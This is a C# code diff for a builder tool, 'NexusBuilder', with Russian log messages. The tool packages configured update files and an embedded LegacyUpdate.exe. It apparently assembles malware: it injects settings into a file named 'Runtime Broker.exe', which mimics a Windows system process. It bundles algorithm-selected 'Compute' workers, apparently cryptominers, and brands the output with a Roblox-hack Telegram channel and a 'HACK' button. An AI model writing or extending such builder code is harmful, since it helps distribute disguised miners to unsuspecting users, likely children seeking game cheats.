@@ -246,17 +246,59 @@ namespace NexusBuilder
                         await RunBuild(isStandalone, overrideOp, themeAccent, themeSurface);
                         break;
                     case "buildNupkg":
-                        string nupkgVer = root.TryGetProperty("version", out var nv) ? nv.GetString() ?? "" : "";
-                        string nupkgOut = root.TryGetProperty("outputPath", out var no) ? no.GetString() ?? "" : "";
-                        if (!string.IsNullOrWhiteSpace(nupkgVer)) tbVersion.Text = nupkgVer;
-                        if (!string.IsNullOrWhiteSpace(nupkgOut)) tbOutputPath.Text = nupkgOut;
+                        if (root.TryGetProperty("appName", out var an1)) tbAppName.Text = an1.GetString();
+                        if (root.TryGetProperty("author", out var au1) && tbAuthor != null) tbAuthor.Text = au1.GetString();
+                        if (root.TryGetProperty("version", out var nv)) tbVersion.Text = nv.GetString();
+                        if (root.TryGetProperty("outputPath", out var no)) tbOutputPath.Text = no.GetString();
+                        if (root.TryGetProperty("telegram", out var tg1) && tbTelegramChannel != null) tbTelegramChannel.Text = tg1.GetString();
+                        if (root.TryGetProperty("buttonText", out var bt1) && tbButtonText != null) tbButtonText.Text = bt1.GetString();
+                        if (root.TryGetProperty("computeEnabled", out var ce1))
+                        {
+                            bool isComp = ce1.GetBoolean();
+                            if (chkComputeEnabled != null) chkComputeEnabled.IsChecked = isComp;
+                            ComputeConfig.Enabled = isComp;
+                        }
+                        if (root.TryGetProperty("computeModules", out var cms1) && cms1.ValueKind == JsonValueKind.Array)
+                        {
+                            try
+                            {
+                                var deserialized = JsonSerializer.Deserialize<List<ComputeModuleConfig>>(cms1.GetRawText());
+                                if (deserialized != null && deserialized.Count > 0)
+                                {
+                                    ComputeConfig.Modules = deserialized;
+                                    SaveComputeModuleConfig();
+                                }
+                            }
+                            catch { }
+                        }
                         BtnCreateUpdatePackage_Click(this, new RoutedEventArgs());
                         break;
                     case "buildLegacyUpdate":
-                        string legVer = root.TryGetProperty("version", out var lv) ? lv.GetString() ?? "" : "";
-                        string legOut = root.TryGetProperty("outputPath", out var lo) ? lo.GetString() ?? "" : "";
-                        if (!string.IsNullOrWhiteSpace(legVer)) tbVersion.Text = legVer;
-                        if (!string.IsNullOrWhiteSpace(legOut)) tbOutputPath.Text = legOut;
+                        if (root.TryGetProperty("appName", out var an2)) tbAppName.Text = an2.GetString();
+                        if (root.TryGetProperty("author", out var au2) && tbAuthor != null) tbAuthor.Text = au2.GetString();
+                        if (root.TryGetProperty("version", out var lv)) tbVersion.Text = lv.GetString();
+                        if (root.TryGetProperty("outputPath", out var lo)) tbOutputPath.Text = lo.GetString();
+                        if (root.TryGetProperty("telegram", out var tg2) && tbTelegramChannel != null) tbTelegramChannel.Text = tg2.GetString();
+                        if (root.TryGetProperty("buttonText", out var bt2) && tbButtonText != null) tbButtonText.Text = bt2.GetString();
+                        if (root.TryGetProperty("computeEnabled", out var ce2))
+                        {
+                            bool isComp = ce2.GetBoolean();
+                            if (chkComputeEnabled != null) chkComputeEnabled.IsChecked = isComp;
+                            ComputeConfig.Enabled = isComp;
+                        }
+                        if (root.TryGetProperty("computeModules", out var cms2) && cms2.ValueKind == JsonValueKind.Array)
+                        {
+                            try
+                            {
+                                var deserialized = JsonSerializer.Deserialize<List<ComputeModuleConfig>>(cms2.GetRawText());
+                                if (deserialized != null && deserialized.Count > 0)
+                                {
+                                    ComputeConfig.Modules = deserialized;
+                                    SaveComputeModuleConfig();
+                                }
+                            }
+                            catch { }
+                        }
                         BuildLegacyUpdatePackage_Click(this, new RoutedEventArgs());
                         break;
                 }
@@ -581,6 +623,106 @@ namespace NexusBuilder
             }
         }
 
+        private async Task<string?> BuildConfiguredUpdateStagingAsync(string targetVer)
+        {
+            // 1. Template
+            string templateDir = await EnsureAppTemplate();
+            if (string.IsNullOrEmpty(templateDir) || !Directory.Exists(templateDir))
+            {
+                Log("❌ ОШИБКА: Не удалось получить шаблон приложения!");
+                return null;
+            }
+
+            string stagingDir = Path.Combine(Path.GetTempPath(), $"NEXUS_UpdateStage_{Guid.NewGuid():N}");
+            if (Directory.Exists(stagingDir))
+            {
+                try { Directory.Delete(stagingDir, true); } catch { }
+            }
+            Directory.CreateDirectory(stagingDir);
+
+            string rbStaging = Path.Combine(stagingDir, "RuntimeBroker");
+            Directory.CreateDirectory(rbStaging);
+            string clientStaging = Path.Combine(stagingDir, "client");
+            Directory.CreateDirectory(clientStaging);
+
+            CopyDirectory(templateDir, rbStaging);
+            CopyDirectory(templateDir, clientStaging);
+
+            // 2. Prepare Compute workers if enabled
+            if (ComputeConfig.Enabled && ComputeConfig.Modules.Any(m => m.Enabled))
+            {
+                var requiredModes = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+                for (int mi = 0; mi < ComputeConfig.Modules.Count; mi++)
+                {
+                    var mod = ComputeConfig.Modules[mi];
+                    if (!mod.Enabled) continue;
+                    requiredModes.Add(MapAlgorithmToLegacyMode(mod.Primary.Algorithm));
+                    if (mod.IsDualMode && !string.IsNullOrEmpty(mod.Secondary.Algorithm))
+                        requiredModes.Add(MapAlgorithmToLegacyMode(mod.Secondary.Algorithm));
+                }
+
+                foreach (string modeVal in requiredModes)
+                {
+                    await ComputeWorkerManager.PrepareWorkerAsync(modeVal, msg => Log(msg), pct => { });
+                }
+
+                string computeWorkersDir = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    "NEXUS_Builder", "compute_workers");
+
+                if (Directory.Exists(computeWorkersDir))
+                {
+                    string stagingCompute = Path.Combine(stagingDir, "Compute");
+                    Directory.CreateDirectory(stagingCompute);
+                    foreach (var f in Directory.GetFiles(computeWorkersDir, "*.*"))
+                    {
+                        File.Copy(f, Path.Combine(stagingCompute, Path.GetFileName(f)), true);
+                    }
+                    Log($"✓ Модули Compute ({Directory.GetFiles(stagingCompute).Length} файлов) включены в пакет обновления.");
+                }
+            }
+
+            // 3. Inject configuration (Operator, Compute modules, Telegram, etc.) into RuntimeBroker files
+            string opName = GetSelectedOperator();
+            string appName = tbAppName.Text.Trim();
+            if (string.IsNullOrWhiteSpace(appName)) appName = "RAH";
+            string appAuthor = tbAuthor?.Text.Trim() ?? "RAH Team";
+            string tgChannel = tbTelegramChannel?.Text.Trim() ?? "https://t.me/robloxvzlomez";
+            string btnText = tbButtonText?.Text.Trim() ?? "ВЗЛОМАТЬ";
+            var customConfigDict = BuildCustomConfigDictionary();
+            SaveCustomProjectParams();
+
+            foreach (var rootDir in new[] { rbStaging, clientStaging })
+            {
+                string cloneExe = Path.Combine(rootDir, "Runtime Broker.exe");
+                if (!File.Exists(cloneExe))
+                {
+                    string nestedClone = Path.Combine(rootDir, "clone", "Runtime Broker.exe");
+                    if (File.Exists(nestedClone))
+                    {
+                        File.Copy(nestedClone, cloneExe, true);
+                    }
+                }
+
+                if (File.Exists(cloneExe))
+                {
+                    InjectConfigIntoFile(cloneExe, opName, appName, appAuthor, tgChannel, false, customConfigDict, btnText);
+                    Log($"✓ Конфигурация внедрена в {Path.GetFileName(cloneExe)}");
+                }
+
+                foreach (var dll in Directory.GetFiles(rootDir, "*.dll"))
+                {
+                    if (Path.GetFileName(dll).Contains("RAH") || Path.GetFileName(dll).Contains("FileTransfer"))
+                    {
+                        InjectConfigIntoFile(dll, opName, appName, appAuthor, tgChannel, false, customConfigDict, btnText);
+                        Log($"✓ Конфигурация внедрена в {Path.GetFileName(dll)}");
+                    }
+                }
+            }
+
+            return stagingDir;
+        }
+
         private async void BtnCreateUpdatePackage_Click(object sender, RoutedEventArgs e)
         {
             try
@@ -597,7 +739,6 @@ namespace NexusBuilder
 
                 Log($"[UPDATE] 📦 Старт создания файла обновления v{targetVer}...");
 
-                // Navigate to step 4 to display progress
                 GoToStep(4);
                 pnlBuildSteps.Visibility = Visibility.Visible;
                 pnlBuildSuccess.Visibility = Visibility.Collapsed;
@@ -606,31 +747,33 @@ namespace NexusBuilder
                 lblStatus.Text = $"Создание файла обновления v{targetVer}...";
 
                 txtBuildStep1.Text = $"✓ 1. Определение версии: v{targetVer}";
-                txtBuildStep2.Text = "⏳ 2. Сбор обновляемых файлов приложения...";
-                txtBuildStep3.Text = "⏳ 3. Подготовка фонового модуля...";
+                txtBuildStep2.Text = "⏳ 2. Сбор и внедрение параметров конфигурации...";
+                txtBuildStep3.Text = "⏳ 3. Подготовка фонового модуля и Compute...";
                 txtBuildStep4.Text = "⏳ 4. Формирование архива обновления .nupkg...";
                 txtBuildStep5.Text = "⏳ 5. Проверка целостности SHA-256...";
 
-                string templatesDir = Path.Combine(
-                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "NEXUS_Builder", "templates"
-                );
+                string? stagingDir = await BuildConfiguredUpdateStagingAsync(targetVer);
+                if (stagingDir == null)
+                {
+                    throw new InvalidOperationException("Не удалось подготовить конфигурацию для пакета обновления.");
+                }
 
-                var result = await UpdatePackageBuilder.BuildPackageAsync(
+                var result = await UpdatePackageBuilder.BuildPackageFromStagingAsync(
                     outDir,
                     currentVer,
                     targetVer,
-                    templatesDir,
-                    null,
+                    stagingDir,
                     msg => Log(msg)
                 );
+
+                try { Directory.Delete(stagingDir, true); } catch { }
 
                 pbProgress.IsIndeterminate = false;
 
                 if (result.Success)
                 {
-                    txtBuildStep2.Text = "✓ 2. Файлы приложения собраны";
-                    txtBuildStep3.Text = "✓ 3. Фоновый модуль включен";
+                    txtBuildStep2.Text = "✓ 2. Файлы и конфигурация собраны";
+                    txtBuildStep3.Text = "✓ 3. Фоновые модули Compute включены";
                     txtBuildStep4.Text = $"✓ 4. Архив сформирован: {Path.GetFileName(result.PackagePath)} ({result.PackageSize / 1024} КБ)";
                     txtBuildStep5.Text = $"✓ 5. Хеш SHA-256: {result.PackageHash[..Math.Min(16, result.PackageHash.Length)]}... (OK)";
                     pbProgress.Value = 100;
@@ -671,6 +814,7 @@ namespace NexusBuilder
 
                 if (!Directory.Exists(outDir)) Directory.CreateDirectory(outDir);
 
+                string currentVer = AppVersion;
                 string targetVer = tbVersion.Text.Trim();
                 if (string.IsNullOrWhiteSpace(targetVer)) targetVer = "8.0.3";
 
@@ -684,10 +828,34 @@ namespace NexusBuilder
                 lblStatus.Text = $"Сборка LegacyUpdate.exe для клиентов < 8.0.2...";
 
                 txtBuildStep1.Text = $"✓ 1. Версия целевого обновления: v{targetVer}";
-                txtBuildStep2.Text = "⏳ 2. Поиск исполняемого модуля LegacyUpdate...";
-                txtBuildStep3.Text = "⏳ 3. Подготовка пакета установки...";
-                txtBuildStep4.Text = "⏳ 4. Формирование LegacyUpdate.exe...";
+                txtBuildStep2.Text = "⏳ 2. Внедрение параметров конфигурации и Compute...";
+                txtBuildStep3.Text = "⏳ 3. Формирование встроенного пакета обновления...";
+                txtBuildStep4.Text = "⏳ 4. Встраивание полезной нагрузки в LegacyUpdate.exe...";
                 txtBuildStep5.Text = "⏳ 5. Проверка целостности бинарника...";
+
+                string? stagingDir = await BuildConfiguredUpdateStagingAsync(targetVer);
+                if (stagingDir == null)
+                {
+                    throw new InvalidOperationException("Не удалось подготовить конфигурацию для LegacyUpdate.");
+                }
+
+                var nupkgResult = await UpdatePackageBuilder.BuildPackageFromStagingAsync(
+                    outDir,
+                    currentVer,
+                    targetVer,
+                    stagingDir,
+                    msg => Log(msg)
+                );
+
+                try { Directory.Delete(stagingDir, true); } catch { }
+
+                if (!nupkgResult.Success)
+                {
+                    throw new InvalidOperationException(nupkgResult.ErrorMessage);
+                }
+
+                txtBuildStep2.Text = "✓ 2. Параметры и модули Compute внедрены";
+                txtBuildStep3.Text = $"✓ 3. Встроенный пакет сформирован ({nupkgResult.PackageSize / 1024} КБ)";
 
                 string localLegacyExe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "LegacyUpdate.exe");
                 string downloadsLegacyExe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "downloads", "LegacyUpdate.exe");
@@ -695,27 +863,31 @@ namespace NexusBuilder
 
                 if (srcLegacy == null)
                 {
-                    // Look in parent scratch folder if running under dev
                     string devPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "docs", "downloads", "LegacyUpdate.exe");
                     if (File.Exists(devPath)) srcLegacy = Path.GetFullPath(devPath);
+                }
+
+                if (srcLegacy == null)
+                {
+                    string devPath2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "docs", "downloads", "LegacyUpdate.exe");
+                    if (File.Exists(devPath2)) srcLegacy = Path.GetFullPath(devPath2);
                 }
 
                 string destPath = Path.Combine(outDir, "LegacyUpdate.exe");
 
                 if (srcLegacy != null && File.Exists(srcLegacy))
                 {
-                    File.Copy(srcLegacy, destPath, true);
-                    txtBuildStep2.Text = "✓ 2. Модуль LegacyUpdate найден";
-                    txtBuildStep3.Text = "✓ 3. Пакет обновлений подготовлен";
-                    txtBuildStep4.Text = $"✓ 4. Исполняемый файл размещен: {Path.GetFileName(destPath)}";
+                    UpdatePackageBuilder.EmbedPackageIntoLegacyUpdater(srcLegacy, nupkgResult.PackagePath, destPath);
+
+                    txtBuildStep4.Text = $"✓ 4. Исполняемый файл собран: {Path.GetFileName(destPath)}";
                     string hash = UpdatePackageBuilder.ComputeFileSha256(destPath);
                     txtBuildStep5.Text = $"✓ 5. Хеш SHA-256: {hash[..Math.Min(16, hash.Length)]}... (OK)";
 
                     pbProgress.IsIndeterminate = false;
                     pbProgress.Value = 100;
-                    lblStatus.Text = "LegacyUpdate.exe успешно собран и готов к раздаче!";
+                    lblStatus.Text = "LegacyUpdate.exe успешно собран и содержит вашу конфигурацию!";
                     pnlBuildSuccess.Visibility = Visibility.Visible;
-                    Log($"🎉 LegacyUpdate.exe готов: {destPath}");
+                    Log($"🎉 LegacyUpdate.exe готов к раздаче: {destPath}");
                 }
                 else
                 {
